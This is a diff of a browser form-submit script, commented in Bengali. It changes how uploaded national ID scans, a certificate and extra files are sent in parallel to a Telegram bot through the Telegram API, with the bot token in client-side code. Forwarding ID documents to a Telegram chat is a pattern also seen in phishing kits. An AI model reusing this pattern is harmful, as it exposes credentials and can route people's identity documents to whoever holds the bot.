@@ -116,26 +116,31 @@ form.addEventListener('submit', async (e) => {
     body: JSON.stringify({ chat_id: chatId, text: message })
   });
 
+  // ফাইল পাঠানোর ফাংশন
   async function sendFile(file) {
     if (file) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('document', file);
-      await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
-        method: 'POST', body: formData
+      return fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
+        method: 'POST',
+        body: formData
       });
     }
   }
 
+  // সব ফাইল একসাথে পাঠানো (Firefox fix)
+  let fileUploads = [];
   if (nidOption.value === 'separate') {
-    await sendFile(nidFront);
-    await sendFile(nidBack);
+    if (nidFront) fileUploads.push(sendFile(nidFront));
+    if (nidBack) fileUploads.push(sendFile(nidBack));
   } else if (nidOption.value === 'combined') {
-    await sendFile(nidCombined);
+    if (nidCombined) fileUploads.push(sendFile(nidCombined));
   }
+  if (certificateFile) fileUploads.push(sendFile(certificateFile));
+  extraFiles.forEach(f => fileUploads.push(sendFile(f)));
 
-  await sendFile(certificateFile);
-  for (const f of extraFiles) await sendFile(f);
+  await Promise.all(fileUploads);
 
   // Hide loading + show success
   loadingDiv.style.display = 'none';
